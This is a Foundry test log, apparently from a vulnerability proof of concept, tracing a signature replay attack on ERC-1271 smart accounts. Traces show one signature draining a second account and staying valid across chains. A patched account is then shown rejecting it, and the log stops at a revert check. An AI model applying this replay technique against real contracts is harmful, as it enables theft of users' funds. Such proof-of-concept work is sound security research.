@@ -1,0 +1,312 @@
+Compiling 41 files with Solc 0.8.24
+Solc 0.8.24 finished in 1.05s
+Compiler run successful!
+
+Ran 4 tests for test/56710-potential-signature-replay-attack-in-erc1271handler-openzepp_exp.sol:SignatureReplay_56710_Test
+[PASS] testFuzz_CrossAccountReplay(address,uint96,uint256) (runs: 256, μ: 153631, ~: 153461)
+Traces:
+  [2388189] SignatureReplay_56710_Test::setUp()
+    ├─ [0] VM::deal(SignatureReplay_56710_Test: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1000000000000000000000000 [1e24])
+    │   └─ ← [Return]
+    ├─ [0] VM::addr(<pk>) [staticcall]
+    │   └─ ← [Return] 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7
+    ├─ [879316] → new TestSsoAccount@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   └─ ← [Return] 4392 bytes of code
+    ├─ [879316] → new TestSsoAccount@0x2e234DAe75C793f67A35089C9d99245E1C58470b
+    │   └─ ← [Return] 4392 bytes of code
+    ├─ [68328] TestSsoAccount::initOwner(0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7)
+    │   ├─ emit K1OwnerAdded(addr: 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7)
+    │   └─ ← [Stop]
+    ├─ [68328] TestSsoAccount::initOwner(0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7)
+    │   ├─ emit K1OwnerAdded(addr: 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7)
+    │   └─ ← [Stop]
+    ├─ [299737] → new SignatureGatedVault@0xF62849F9A0B5Bf2913b396098F7c7019b51A820a
+    │   └─ ← [Return] 1497 bytes of code
+    └─ ← [Stop]
+
+  [193261] SignatureReplay_56710_Test::testFuzz_CrossAccountReplay(0x0000000000000000000000000000000000000052, 306, 4)
+    ├─ [0] VM::assume(true) [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::assume(true) [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] console::log("Bound result", 306) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [22638] SignatureGatedVault::deposit{value: 306}(TestSsoAccount: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   ├─  storage changes:
+    │   │   @ 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11: 0 → 306
+    │   └─ ← [Stop]
+    ├─ [22638] SignatureGatedVault::deposit{value: 306}(TestSsoAccount: [0x2e234DAe75C793f67A35089C9d99245E1C58470b])
+    │   ├─  storage changes:
+    │   │   @ 0xc6bd81b73d1fd76b6ab7b2a3e675f602f162633118b2ec0b74d6456669dd8579: 0 → 306
+    │   └─ ← [Stop]
+    ├─ [640] SignatureGatedVault::orderHashOf(0x0000000000000000000000000000000000000052, 306, 4) [staticcall]
+    │   └─ ← [Return] 0xd7f74f6c08b7c91dc0074b925a15ba966fae6a9c8f4fe4b383670e308e39e516
+    ├─ [0] VM::sign("<pk>", 0xd7f74f6c08b7c91dc0074b925a15ba966fae6a9c8f4fe4b383670e308e39e516) [staticcall]
+    │   └─ ← [Return] 28, 0xbd1a79f89fdb03ea95536b69bf79c2e56c473192eaa5c4015b49570160c25da2, 0x1a6a2652ce0c2b3870cf23778348e2a2c0abbaa157bf770e6dfe6aaaf473af40
+    ├─ [65816] SignatureGatedVault::withdraw(TestSsoAccount: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x0000000000000000000000000000000000000052, 306, 4, 0xbd1a79f89fdb03ea95536b69bf79c2e56c473192eaa5c4015b49570160c25da21a6a2652ce0c2b3870cf23778348e2a2c0abbaa157bf770e6dfe6aaaf473af401c)
+    │   ├─ [6869] TestSsoAccount::isValidSignature(0xd7f74f6c08b7c91dc0074b925a15ba966fae6a9c8f4fe4b383670e308e39e516, 0xbd1a79f89fdb03ea95536b69bf79c2e56c473192eaa5c4015b49570160c25da21a6a2652ce0c2b3870cf23778348e2a2c0abbaa157bf770e6dfe6aaaf473af401c) [staticcall]
+    │   │   ├─ [3000] PRECOMPILES::ecrecover(0xd7f74f6c08b7c91dc0074b925a15ba966fae6a9c8f4fe4b383670e308e39e516, 28, 85533908220131072549835707645121013909931274534542704548100957129063853612450, 11947684350807577634433059719589662142101761973273089595464581538535376662336) [staticcall]
+    │   │   │   └─ ← [Return] 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7
+    │   │   └─ ← [Return] 0x1626ba7e
+    │   ├─ [0] 0x0000000000000000000000000000000000000052::fallback{value: 306}()
+    │   │   └─ ← [Stop]
+    │   ├─  storage changes:
+    │   │   @ 0x6a2402de96f6cc7e56101949aa7ecd4e5f059369cb521607d007ad73c7d62e84: 0 → 1
+    │   │   @ 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11: 306 → 0
+    │   └─ ← [Stop]
+    ├─ [40816] SignatureGatedVault::withdraw(TestSsoAccount: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 0x0000000000000000000000000000000000000052, 306, 4, 0xbd1a79f89fdb03ea95536b69bf79c2e56c473192eaa5c4015b49570160c25da21a6a2652ce0c2b3870cf23778348e2a2c0abbaa157bf770e6dfe6aaaf473af401c)
+    │   ├─ [6869] TestSsoAccount::isValidSignature(0xd7f74f6c08b7c91dc0074b925a15ba966fae6a9c8f4fe4b383670e308e39e516, 0xbd1a79f89fdb03ea95536b69bf79c2e56c473192eaa5c4015b49570160c25da21a6a2652ce0c2b3870cf23778348e2a2c0abbaa157bf770e6dfe6aaaf473af401c) [staticcall]
+    │   │   ├─ [3000] PRECOMPILES::ecrecover(0xd7f74f6c08b7c91dc0074b925a15ba966fae6a9c8f4fe4b383670e308e39e516, 28, 85533908220131072549835707645121013909931274534542704548100957129063853612450, 11947684350807577634433059719589662142101761973273089595464581538535376662336) [staticcall]
+    │   │   │   └─ ← [Return] 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7
+    │   │   └─ ← [Return] 0x1626ba7e
+    │   ├─ [0] 0x0000000000000000000000000000000000000052::fallback{value: 306}()
+    │   │   └─ ← [Stop]
+    │   ├─  storage changes:
+    │   │   @ 0xc07b263f34ec489852bef28c1866f881d68ca88730615dd3ed41b0491600556c: 0 → 1
+    │   │   @ 0xc6bd81b73d1fd76b6ab7b2a3e675f602f162633118b2ec0b74d6456669dd8579: 306 → 0
+    │   └─ ← [Stop]
+    ├─ [566] SignatureGatedVault::balanceOf(TestSsoAccount: [0x2e234DAe75C793f67A35089C9d99245E1C58470b]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertEq(0, 0, "B always drained by replay") [staticcall]
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+[PASS] test_CrossAccountReplay_DrainsSecondAccount() (gas: 178545)
+Logs:
+  owner        : 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7
+  attacker     : 0x1111111111111111111111111111111111111111
+  0x4fe4427f79eccb4619bdea153692e8745a86013ad8224a666aafbe4ec5190ed0
+  0x3da1e9a4046a66bcd2fc6447475cd72c594d878dcb45889bd1669465ef8332aa0fc35246220c1ca7c46a15b8620fe0c92378bb7745445a6fa341b6f646b16d5e1b
+
+Traces:
+  [2388189] SignatureReplay_56710_Test::setUp()
+    ├─ [0] VM::deal(SignatureReplay_56710_Test: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1000000000000000000000000 [1e24])
+    │   └─ ← [Return]
+    ├─ [0] VM::addr(<pk>) [staticcall]
+    │   └─ ← [Return] 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7
+    ├─ [879316] → new TestSsoAccount@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   └─ ← [Return] 4392 bytes of code
+    ├─ [879316] → new TestSsoAccount@0x2e234DAe75C793f67A35089C9d99245E1C58470b
+    │   └─ ← [Return] 4392 bytes of code
+    ├─ [68328] TestSsoAccount::initOwner(0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7)
+    │   ├─ emit K1OwnerAdded(addr: 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7)
+    │   └─ ← [Stop]
+    ├─ [68328] TestSsoAccount::initOwner(0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7)
+    │   ├─ emit K1OwnerAdded(addr: 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7)
+    │   └─ ← [Stop]
+    ├─ [299737] → new SignatureGatedVault@0xF62849F9A0B5Bf2913b396098F7c7019b51A820a
+    │   └─ ← [Return] 1497 bytes of code
+    └─ ← [Stop]
+
+  [218345] SignatureReplay_56710_Test::test_CrossAccountReplay_DrainsSecondAccount()
+    ├─ [22638] SignatureGatedVault::deposit{value: 1000000000000000000}(TestSsoAccount: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   ├─  storage changes:
+    │   │   @ 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11: 0 → 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   └─ ← [Stop]
+    ├─ [22638] SignatureGatedVault::deposit{value: 1000000000000000000}(TestSsoAccount: [0x2e234DAe75C793f67A35089C9d99245E1C58470b])
+    │   ├─  storage changes:
+    │   │   @ 0xc6bd81b73d1fd76b6ab7b2a3e675f602f162633118b2ec0b74d6456669dd8579: 0 → 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   └─ ← [Stop]
+    ├─ [566] SignatureGatedVault::balanceOf(TestSsoAccount: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   └─ ← [Return] 1000000000000000000 [1e18]
+    ├─ [0] VM::assertEq(1000000000000000000 [1e18], 1000000000000000000 [1e18]) [staticcall]
+    │   └─ ← [Return]
+    ├─ [566] SignatureGatedVault::balanceOf(TestSsoAccount: [0x2e234DAe75C793f67A35089C9d99245E1C58470b]) [staticcall]
+    │   └─ ← [Return] 1000000000000000000 [1e18]
+    ├─ [0] VM::assertEq(1000000000000000000 [1e18], 1000000000000000000 [1e18]) [staticcall]
+    │   └─ ← [Return]
+    ├─ [640] SignatureGatedVault::orderHashOf(0x1111111111111111111111111111111111111111, 1000000000000000000 [1e18], 0) [staticcall]
+    │   └─ ← [Return] 0x4fe4427f79eccb4619bdea153692e8745a86013ad8224a666aafbe4ec5190ed0
+    ├─ [0] VM::sign("<pk>", 0x4fe4427f79eccb4619bdea153692e8745a86013ad8224a666aafbe4ec5190ed0) [staticcall]
+    │   └─ ← [Return] 27, 0x3da1e9a4046a66bcd2fc6447475cd72c594d878dcb45889bd1669465ef8332aa, 0x0fc35246220c1ca7c46a15b8620fe0c92378bb7745445a6fa341b6f646b16d5e
+    ├─ [0] VM::assertEq(65, 65) [staticcall]
+    │   └─ ← [Return]
+    ├─ [6869] TestSsoAccount::isValidSignature(0x4fe4427f79eccb4619bdea153692e8745a86013ad8224a666aafbe4ec5190ed0, 0x3da1e9a4046a66bcd2fc6447475cd72c594d878dcb45889bd1669465ef8332aa0fc35246220c1ca7c46a15b8620fe0c92378bb7745445a6fa341b6f646b16d5e1b) [staticcall]
+    │   ├─ [3000] PRECOMPILES::ecrecover(0x4fe4427f79eccb4619bdea153692e8745a86013ad8224a666aafbe4ec5190ed0, 27, 27877158669803645312295324010034242910425710833235442097123545622079493845674, 7129795740363084774404164644951122324766325742566935600577164391491388403038) [staticcall]
+    │   │   └─ ← [Return] 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7
+    │   └─ ← [Return] 0x1626ba7e
+    ├─ [0] VM::assertEq(0x1626ba7e00000000000000000000000000000000000000000000000000000000, 0x1626ba7e00000000000000000000000000000000000000000000000000000000, "A must accept (intended)") [staticcall]
+    │   └─ ← [Return]
+    ├─ [6869] TestSsoAccount::isValidSignature(0x4fe4427f79eccb4619bdea153692e8745a86013ad8224a666aafbe4ec5190ed0, 0x3da1e9a4046a66bcd2fc6447475cd72c594d878dcb45889bd1669465ef8332aa0fc35246220c1ca7c46a15b8620fe0c92378bb7745445a6fa341b6f646b16d5e1b) [staticcall]
+    │   ├─ [3000] PRECOMPILES::ecrecover(0x4fe4427f79eccb4619bdea153692e8745a86013ad8224a666aafbe4ec5190ed0, 27, 27877158669803645312295324010034242910425710833235442097123545622079493845674, 7129795740363084774404164644951122324766325742566935600577164391491388403038) [staticcall]
+    │   │   └─ ← [Return] 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7
+    │   └─ ← [Return] 0x1626ba7e
+    ├─ [0] VM::assertEq(0x1626ba7e00000000000000000000000000000000000000000000000000000000, 0x1626ba7e00000000000000000000000000000000000000000000000000000000, "B accepts the SAME sig (replay)") [staticcall]
+    │   └─ ← [Return]
+    ├─ [61316] SignatureGatedVault::withdraw(TestSsoAccount: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x1111111111111111111111111111111111111111, 1000000000000000000 [1e18], 0, 0x3da1e9a4046a66bcd2fc6447475cd72c594d878dcb45889bd1669465ef8332aa0fc35246220c1ca7c46a15b8620fe0c92378bb7745445a6fa341b6f646b16d5e1b)
+    │   ├─ [4869] TestSsoAccount::isValidSignature(0x4fe4427f79eccb4619bdea153692e8745a86013ad8224a666aafbe4ec5190ed0, 0x3da1e9a4046a66bcd2fc6447475cd72c594d878dcb45889bd1669465ef8332aa0fc35246220c1ca7c46a15b8620fe0c92378bb7745445a6fa341b6f646b16d5e1b) [staticcall]
+    │   │   ├─ [3000] PRECOMPILES::ecrecover(0x4fe4427f79eccb4619bdea153692e8745a86013ad8224a666aafbe4ec5190ed0, 27, 27877158669803645312295324010034242910425710833235442097123545622079493845674, 7129795740363084774404164644951122324766325742566935600577164391491388403038) [staticcall]
+    │   │   │   └─ ← [Return] 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7
+    │   │   └─ ← [Return] 0x1626ba7e
+    │   ├─ [0] 0x1111111111111111111111111111111111111111::fallback{value: 1000000000000000000}()
+    │   │   └─ ← [Stop]
+    │   ├─  storage changes:
+    │   │   @ 0x0b899e9631b0a2d89c435e1201743bba5dc175d39eb4dfc5764a32af2316dfa8: 0 → 1
+    │   │   @ 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11: 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000 → 0
+    │   └─ ← [Stop]
+    ├─ [36316] SignatureGatedVault::withdraw(TestSsoAccount: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 0x1111111111111111111111111111111111111111, 1000000000000000000 [1e18], 0, 0x3da1e9a4046a66bcd2fc6447475cd72c594d878dcb45889bd1669465ef8332aa0fc35246220c1ca7c46a15b8620fe0c92378bb7745445a6fa341b6f646b16d5e1b)
+    │   ├─ [4869] TestSsoAccount::isValidSignature(0x4fe4427f79eccb4619bdea153692e8745a86013ad8224a666aafbe4ec5190ed0, 0x3da1e9a4046a66bcd2fc6447475cd72c594d878dcb45889bd1669465ef8332aa0fc35246220c1ca7c46a15b8620fe0c92378bb7745445a6fa341b6f646b16d5e1b) [staticcall]
+    │   │   ├─ [3000] PRECOMPILES::ecrecover(0x4fe4427f79eccb4619bdea153692e8745a86013ad8224a666aafbe4ec5190ed0, 27, 27877158669803645312295324010034242910425710833235442097123545622079493845674, 7129795740363084774404164644951122324766325742566935600577164391491388403038) [staticcall]
+    │   │   │   └─ ← [Return] 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7
+    │   │   └─ ← [Return] 0x1626ba7e
+    │   ├─ [0] 0x1111111111111111111111111111111111111111::fallback{value: 1000000000000000000}()
+    │   │   └─ ← [Stop]
+    │   ├─  storage changes:
+    │   │   @ 0xeba93804096a67899cbfd8bb336e04ad7bccc6f244b123004a69377f4953bfa9: 0 → 1
+    │   │   @ 0xc6bd81b73d1fd76b6ab7b2a3e675f602f162633118b2ec0b74d6456669dd8579: 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000 → 0
+    │   └─ ← [Stop]
+    ├─ [566] SignatureGatedVault::balanceOf(TestSsoAccount: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertEq(0, 0, "A settled (intended)") [staticcall]
+    │   └─ ← [Return]
+    ├─ [566] SignatureGatedVault::balanceOf(TestSsoAccount: [0x2e234DAe75C793f67A35089C9d99245E1C58470b]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertEq(0, 0, "B DRAINED via replay (unauthorized)") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::assertEq(2000000000000000000 [2e18], 2000000000000000000 [2e18], "attacker doubled the payout") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] console::log("owner        :", 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("attacker     :", 0x1111111111111111111111111111111111111111) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log(0x4fe4427f79eccb4619bdea153692e8745a86013ad8224a666aafbe4ec5190ed0) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log(0x3da1e9a4046a66bcd2fc6447475cd72c594d878dcb45889bd1669465ef8332aa0fc35246220c1ca7c46a15b8620fe0c92378bb7745445a6fa341b6f646b16d5e1b) [staticcall]
+    │   └─ ← [Stop]
+    └─ ← [Stop]
+
+[PASS] test_CrossChainReplay_SameAccount() (gas: 111932)
+Traces:
+  [2388189] SignatureReplay_56710_Test::setUp()
+    ├─ [0] VM::deal(SignatureReplay_56710_Test: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1000000000000000000000000 [1e24])
+    │   └─ ← [Return]
+    ├─ [0] VM::addr(<pk>) [staticcall]
+    │   └─ ← [Return] 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7
+    ├─ [879316] → new TestSsoAccount@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   └─ ← [Return] 4392 bytes of code
+    ├─ [879316] → new TestSsoAccount@0x2e234DAe75C793f67A35089C9d99245E1C58470b
+    │   └─ ← [Return] 4392 bytes of code
+    ├─ [68328] TestSsoAccount::initOwner(0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7)
+    │   ├─ emit K1OwnerAdded(addr: 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7)
+    │   └─ ← [Stop]
+    ├─ [68328] TestSsoAccount::initOwner(0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7)
+    │   ├─ emit K1OwnerAdded(addr: 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7)
+    │   └─ ← [Stop]
+    ├─ [299737] → new SignatureGatedVault@0xF62849F9A0B5Bf2913b396098F7c7019b51A820a
+    │   └─ ← [Return] 1497 bytes of code
+    └─ ← [Stop]
+
+  [131832] SignatureReplay_56710_Test::test_CrossChainReplay_SameAccount()
+    ├─ [640] SignatureGatedVault::orderHashOf(0x1111111111111111111111111111111111111111, 1000000000000000000 [1e18], 0) [staticcall]
+    │   └─ ← [Return] 0x4fe4427f79eccb4619bdea153692e8745a86013ad8224a666aafbe4ec5190ed0
+    ├─ [0] VM::chainId(1)
+    │   └─ ← [Return]
+    ├─ [0] VM::sign("<pk>", 0x4fe4427f79eccb4619bdea153692e8745a86013ad8224a666aafbe4ec5190ed0) [staticcall]
+    │   └─ ← [Return] 27, 0x3da1e9a4046a66bcd2fc6447475cd72c594d878dcb45889bd1669465ef8332aa, 0x0fc35246220c1ca7c46a15b8620fe0c92378bb7745445a6fa341b6f646b16d5e
+    ├─ [6869] TestSsoAccount::isValidSignature(0x4fe4427f79eccb4619bdea153692e8745a86013ad8224a666aafbe4ec5190ed0, 0x3da1e9a4046a66bcd2fc6447475cd72c594d878dcb45889bd1669465ef8332aa0fc35246220c1ca7c46a15b8620fe0c92378bb7745445a6fa341b6f646b16d5e1b) [staticcall]
+    │   ├─ [3000] PRECOMPILES::ecrecover(0x4fe4427f79eccb4619bdea153692e8745a86013ad8224a666aafbe4ec5190ed0, 27, 27877158669803645312295324010034242910425710833235442097123545622079493845674, 7129795740363084774404164644951122324766325742566935600577164391491388403038) [staticcall]
+    │   │   └─ ← [Return] 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7
+    │   └─ ← [Return] 0x1626ba7e
+    ├─ [0] VM::assertEq(0x1626ba7e00000000000000000000000000000000000000000000000000000000, 0x1626ba7e00000000000000000000000000000000000000000000000000000000, "valid on chain 1 (intended)") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::chainId(137)
+    │   └─ ← [Return]
+    ├─ [4869] TestSsoAccount::isValidSignature(0x4fe4427f79eccb4619bdea153692e8745a86013ad8224a666aafbe4ec5190ed0, 0x3da1e9a4046a66bcd2fc6447475cd72c594d878dcb45889bd1669465ef8332aa0fc35246220c1ca7c46a15b8620fe0c92378bb7745445a6fa341b6f646b16d5e1b) [staticcall]
+    │   ├─ [3000] PRECOMPILES::ecrecover(0x4fe4427f79eccb4619bdea153692e8745a86013ad8224a666aafbe4ec5190ed0, 27, 27877158669803645312295324010034242910425710833235442097123545622079493845674, 7129795740363084774404164644951122324766325742566935600577164391491388403038) [staticcall]
+    │   │   └─ ← [Return] 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7
+    │   └─ ← [Return] 0x1626ba7e
+    ├─ [0] VM::assertEq(0x1626ba7e00000000000000000000000000000000000000000000000000000000, 0x1626ba7e00000000000000000000000000000000000000000000000000000000, "REPLAY valid on chain 137 too") [staticcall]
+    │   └─ ← [Return]
+    ├─ [22638] SignatureGatedVault::deposit{value: 1000000000000000000}(TestSsoAccount: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   ├─  storage changes:
+    │   │   @ 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11: 0 → 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   └─ ← [Stop]
+    ├─ [61316] SignatureGatedVault::withdraw(TestSsoAccount: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x1111111111111111111111111111111111111111, 1000000000000000000 [1e18], 0, 0x3da1e9a4046a66bcd2fc6447475cd72c594d878dcb45889bd1669465ef8332aa0fc35246220c1ca7c46a15b8620fe0c92378bb7745445a6fa341b6f646b16d5e1b)
+    │   ├─ [4869] TestSsoAccount::isValidSignature(0x4fe4427f79eccb4619bdea153692e8745a86013ad8224a666aafbe4ec5190ed0, 0x3da1e9a4046a66bcd2fc6447475cd72c594d878dcb45889bd1669465ef8332aa0fc35246220c1ca7c46a15b8620fe0c92378bb7745445a6fa341b6f646b16d5e1b) [staticcall]
+    │   │   ├─ [3000] PRECOMPILES::ecrecover(0x4fe4427f79eccb4619bdea153692e8745a86013ad8224a666aafbe4ec5190ed0, 27, 27877158669803645312295324010034242910425710833235442097123545622079493845674, 7129795740363084774404164644951122324766325742566935600577164391491388403038) [staticcall]
+    │   │   │   └─ ← [Return] 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7
+    │   │   └─ ← [Return] 0x1626ba7e
+    │   ├─ [0] 0x1111111111111111111111111111111111111111::fallback{value: 1000000000000000000}()
+    │   │   └─ ← [Stop]
+    │   ├─  storage changes:
+    │   │   @ 0x0b899e9631b0a2d89c435e1201743bba5dc175d39eb4dfc5764a32af2316dfa8: 0 → 1
+    │   │   @ 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11: 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000 → 0
+    │   └─ ← [Stop]
+    ├─ [566] SignatureGatedVault::balanceOf(TestSsoAccount: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertEq(0, 0, "chain-137 balance drained by chain-1 sig") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::assertEq(1000000000000000000 [1e18], 1000000000000000000 [1e18]) [staticcall]
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+[PASS] test_Fix_BindsAccountAndChain_RejectsReplay() (gas: 617062)
+Traces:
+  [2388189] SignatureReplay_56710_Test::setUp()
+    ├─ [0] VM::deal(SignatureReplay_56710_Test: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1000000000000000000000000 [1e24])
+    │   └─ ← [Return]
+    ├─ [0] VM::addr(<pk>) [staticcall]
+    │   └─ ← [Return] 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7
+    ├─ [879316] → new TestSsoAccount@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   └─ ← [Return] 4392 bytes of code
+    ├─ [879316] → new TestSsoAccount@0x2e234DAe75C793f67A35089C9d99245E1C58470b
+    │   └─ ← [Return] 4392 bytes of code
+    ├─ [68328] TestSsoAccount::initOwner(0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7)
+    │   ├─ emit K1OwnerAdded(addr: 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7)
+    │   └─ ← [Stop]
+    ├─ [68328] TestSsoAccount::initOwner(0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7)
+    │   ├─ emit K1OwnerAdded(addr: 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7)
+    │   └─ ← [Stop]
+    ├─ [299737] → new SignatureGatedVault@0xF62849F9A0B5Bf2913b396098F7c7019b51A820a
+    │   └─ ← [Return] 1497 bytes of code
+    └─ ← [Stop]
+
+  [617062] SignatureReplay_56710_Test::test_Fix_BindsAccountAndChain_RejectsReplay()
+    ├─ [217457] → new FixedSsoAccount@0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9
+    │   └─ ← [Return] 1086 bytes of code
+    ├─ [217457] → new FixedSsoAccount@0xc7183455a4C133Ae270771860664b6B7ec320bB1
+    │   └─ ← [Return] 1086 bytes of code
+    ├─ [22444] FixedSsoAccount::initOwner(0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7)
+    │   ├─  storage changes:
+    │   │   @ 0xc5751e02acbc50610d5b3010ffb7baf66e6d701d3dd4d0f94758ac96870d70ad: 0 → 1
+    │   └─ ← [Stop]
+    ├─ [22444] FixedSsoAccount::initOwner(0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7)
+    │   ├─  storage changes:
+    │   │   @ 0xc5751e02acbc50610d5b3010ffb7baf66e6d701d3dd4d0f94758ac96870d70ad: 0 → 1
+    │   └─ ← [Stop]
+    ├─ [640] SignatureGatedVault::orderHashOf(0x1111111111111111111111111111111111111111, 1000000000000000000 [1e18], 0) [staticcall]
+    │   └─ ← [Return] 0x4fe4427f79eccb4619bdea153692e8745a86013ad8224a666aafbe4ec5190ed0
+    ├─ [509] FixedSsoAccount::boundDigest(0x4fe4427f79eccb4619bdea153692e8745a86013ad8224a666aafbe4ec5190ed0) [staticcall]
+    │   └─ ← [Return] 0x0d842f8e33b6eb9bf2a3481ea357959027be890667da2827706a1859a86f884a
+    ├─ [0] VM::sign("<pk>", 0x0d842f8e33b6eb9bf2a3481ea357959027be890667da2827706a1859a86f884a) [staticcall]
+    │   └─ ← [Return] 27, 0x02abf86143c397c23c6342afdc9c757ed7de65ac42fef295416476c49b271bea, 0x67e0ca7f9e14eed29b6c1a7efb0218ad4275a302e27e8b02aa74d6e43d577f3d
+    ├─ [4834] FixedSsoAccount::isValidSignature(0x4fe4427f79eccb4619bdea153692e8745a86013ad8224a666aafbe4ec5190ed0, 0x02abf86143c397c23c6342afdc9c757ed7de65ac42fef295416476c49b271bea67e0ca7f9e14eed29b6c1a7efb0218ad4275a302e27e8b02aa74d6e43d577f3d1b) [staticcall]
+    │   ├─ [3000] PRECOMPILES::ecrecover(0x0d842f8e33b6eb9bf2a3481ea357959027be890667da2827706a1859a86f884a, 27, 1208470800588853026382599156969238100712244704813044052108690964220987513834, 46985394739910027893970845682106504727270856792135079896651273360054144171837) [staticcall]
+    │   │   └─ ← [Return] 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7
+    │   └─ ← [Return] 0x1626ba7e
+    ├─ [0] VM::assertEq(0x1626ba7e00000000000000000000000000000000000000000000000000000000, 0x1626ba7e00000000000000000000000000000000000000000000000000000000, "fixed A accepts intended sig") [staticcall]
+    │   └─ ← [Return]
+    ├─ [6841] FixedSsoAccount::isValidSignature(0x4fe4427f79eccb4619bdea153692e8745a86013ad8224a666aafbe4ec5190ed0, 0x02abf86143c397c23c6342afdc9c757ed7de65ac42fef295416476c49b271bea67e0ca7f9e14eed29b6c1a7efb0218ad4275a302e27e8b02aa74d6e43d577f3d1b) [staticcall]
+    │   ├─ [3000] PRECOMPILES::ecrecover(0x8d626b4e71340ef36ee8efe339adbda5e4e234a1a95c3159ea4533198e8b6df3, 27, 1208470800588853026382599156969238100712244704813044052108690964220987513834, 46985394739910027893970845682106504727270856792135079896651273360054144171837) [staticcall]
+    │   │   └─ ← [Return] 0xb1CC69223dcB755f9c4F4585Ef9584463ec8eC1d
+    │   └─ ← [Return] 0x00000000
+    ├─ [0] VM::assertEq(0x0000000000000000000000000000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000000000000000000000000000, "fixed B REJECTS the replay") [staticcall]
+    │   └─ ← [Return]
+    ├─ [22638] SignatureGatedVault::deposit{value: 1000000000000000000}(FixedSsoAccount: [0xc7183455a4C133Ae270771860664b6B7ec320bB1])
+    │   ├─  storage changes:
+    │   │   @ 0x8e945654193bec28956c368b451931aae1dd2f910b3127995a9fc7169f7ea4d1: 0 → 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   └─ ← [Stop]
+    ├─ [0] VM::expectRevert(custom error 0xf28dceb3:  vault: bad sig)
+    │   └─ ← [Return]
